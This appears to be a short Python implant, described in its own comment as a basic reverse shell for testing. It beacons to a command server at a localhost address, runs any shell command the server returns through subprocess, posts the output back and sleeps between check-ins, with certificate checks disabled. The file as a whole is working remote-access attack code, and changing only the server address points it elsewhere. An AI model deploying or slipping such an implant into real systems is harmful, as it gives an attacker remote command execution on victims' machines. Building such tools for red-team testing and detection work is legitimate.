## Basic rev shell, only supports command and sleep commands. used for testing

import requests
import subprocess
import time
import uuid

client_id = str(uuid.uuid4())
BASE_URL = "https://127.0.0.1:8081"

while True:
    # Initialize output variable
    output = ""

    # Get from server with "I'm here" data/check-in
    get_url = f"{BASE_URL}/get/{client_id}"
    get_command = requests.get(get_url, verify=False)
    
    rid = get_command.json().get("rid")
    data = get_command.json().get("data", {})

    #print(get_command.json())

    # Parse and run commands
    if "command" in data:
        command_data = data["command"]
        if isinstance(command_data, dict) and "command" in command_data:
            command_to_run = command_data["command"]
            # Run the command and capture its output
            output = subprocess.getoutput(command_to_run)
            #print(f"Command to run: {command_to_run}")

    # Handle sleep command
    if "sleep" in data:
        sleep_time = data["sleep"]
    else:
        sleep_time = 5  # Default sleep time if no sleep command is provided

    # Prepare data to post back to the server
    dict_data_response = {
        "rid": rid,  # Use the stored rid
        "message": "",
        "timestamp": int(time.time()),  # Use current timestamp
        "status": 200,
        "data": {
            "blob": [
                {
                    "encoding": "text",
                    "data": output,
                    "size": len(output)
                }
            ]
        },
    }

    #print(dict_data_response)

    # Post back to the server
    post_url = f"{BASE_URL}/post/{client_id}"
    post_command = requests.post(post_url, json=dict_data_response,verify=False)

    # Sleep for X seconds before the next check-in
    time.sleep(sleep_time)
